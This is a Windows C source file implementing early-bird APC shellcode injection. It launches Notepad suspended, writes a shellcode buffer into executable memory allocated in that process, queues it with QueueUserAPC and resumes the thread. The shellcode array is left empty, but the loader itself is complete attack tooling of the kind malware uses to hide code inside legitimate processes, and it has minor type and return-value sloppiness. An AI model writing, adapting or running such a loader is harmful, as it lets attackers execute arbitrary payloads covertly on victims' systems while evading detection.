#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <processthreadsapi.h>




BOOL CreateSuspendedProcess(LPWSTR lpApplicationName, HANDLE* hthread, HANDLE* hprocess, DWORD* processid);
BOOL RemoteShellCodeInjection(HANDLE hprocess, SIZE_T szshellcode, unsigned char* pshellcode, HANDLE hthread);

int main() {


	HANDLE hthread;
	HANDLE hprocess;
	LPCSTR lpApplicationName = "C:\\Windows\\System32\\Notepad.exe";
	DWORD dwprocessid = NULL;
	unsigned char shellcode[] = {  };

	unsigned char* Pshellcode = shellcode;

	SIZE_T szshellcode = sizeof(shellcode);


	CreateSuspendedProcess(lpApplicationName, &hthread, &hprocess, &dwprocessid);
	RemoteShellCodeInjection(hprocess, szshellcode, Pshellcode, hthread);
	printf("process opened with process id %ld\n", dwprocessid);
	printf("press enter to exti: ");
	getchar();
}

BOOL RemoteShellCodeInjection(HANDLE hprocess, SIZE_T szshellcode, unsigned char* pshellcode, HANDLE hthread)
{


	LPVOID lpaddress = VirtualAllocEx(hprocess, NULL, szshellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (lpaddress == NULL) {
		printf("virtual alloc failed with error no %d\n", GetLastError());
	}
	SIZE_T noofbyteswritten;
	if (WriteProcessMemory(hprocess, lpaddress, pshellcode, szshellcode, &noofbyteswritten) == 0 || szshellcode != noofbyteswritten) {
		printf("The wirte process memory failed with error no %d\n", GetLastError());
	}

if(	QueueUserAPC((PAPCFUNC)lpaddress, hthread, NULL) == 0 ){
		printf("the process queue process failed with error no %d\n", GetLastError());
}

	ResumeThread(hthread);

CloseHandle(hprocess);
CloseHandle(hthread);



}
BOOL CreateSuspendedProcess(LPWSTR lpApplicationName,HANDLE *hthread,HANDLE *hprocess, DWORD *processid) {

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

	if(CreateProcessA(NULL, lpApplicationName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == 0 ){

		printf("createprocess failed with error no %d\n", GetLastError());
		return FALSE;

	}


	*hthread = pi.hThread;
	*hprocess = pi.hProcess;
	*processid = pi.dwProcessId;

	return TRUE;


}
